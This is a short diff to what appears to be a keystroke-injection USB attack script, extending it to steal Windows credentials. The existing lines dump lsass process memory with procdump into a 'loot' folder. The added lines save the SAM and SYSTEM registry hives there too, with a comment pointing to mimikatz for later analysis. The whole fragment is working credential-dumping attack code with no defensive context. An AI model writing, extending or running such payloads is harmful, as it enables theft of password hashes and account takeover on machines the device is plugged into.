@@ -18,4 +18,7 @@ delay(100);
 type('cd $usbPath\\tools\n'); //Move to tools directory
 type('.\\procdump.exe -ma -accepteula lsass.exe $usbPath\\loot\\$env:COMPUTERNAME-lsass\n')
 //Use procdump.exe from tools directory to dump lsass, output saved in loot directory and prepended with computer's name.
+type('reg save HKLM\\SYSTEM $usbPath\\loot\\$env:COMPUTERNAME-SYSTEM.hiv\n')
+type('reg save HKLM\\SAM $usbPath\\loot\\$env:COMPUTERNAME-SAM.hiv\n')
+//These files can be later analysed using mimikatz.
 if (exit) { type('exit\n'); } //Exit the console if chosen to do so
